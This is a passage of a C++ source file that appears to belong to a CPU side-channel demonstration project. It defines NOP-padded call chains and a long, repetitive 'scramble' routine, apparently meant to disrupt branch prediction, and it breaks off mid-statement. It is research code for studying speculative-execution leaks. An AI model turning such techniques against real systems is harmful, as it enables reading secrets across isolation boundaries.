/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

// 4096 works, 8192 and 1024 do not.
static int __gate = 0;
static void s1(void) { if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
static void s2(void) { s1(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
static void s3(void) { s2(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
static void s4(void) { s3(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
static void s5(void) { s4(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
static void s6(void) { s5(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
static void s7(void) { s6(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }
static void s8(void) { s7(); if (__gate) asm volatile(".rept 4096 \n nopl   0x0(%eax) \n .endr"); }

static inline int next(void) {
  static int rng[] = { 1, 4, 5, 6, 1, 2, 4, 7, 1, 3, 5, 11, 10, 8, 1, 9, 3, 6, 3, 3, 5, 6, 11, 3, 1, 2, 3, 2, 2, 4, 4 };
  static int ip;

  int i = rng[ip++];
  if (ip == sizeof(rng) / sizeof(int)) {
    ip = 0;
  }
  return i;
}

static void scramble(void) {
  void (*fp[])(void) = { s1, s2, s3, s4, s5, s6, s7, s8, s1, s2, s3, s4, s5, s6, s7, s8, s1, s2, s3, s4, s5, s6, s7, s8, s1, s2, s3, s4, s5, s6, s7, s8 };
  void (*f)(void);
  static int gate = 0;

  for (int i = 0; i < (1 << next()) + 57; i++) {
    f = fp[next()];
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
    }
    if (next() & 0x1) {
      f(); f(); f(); f(); f();
    }
    if (gate) {
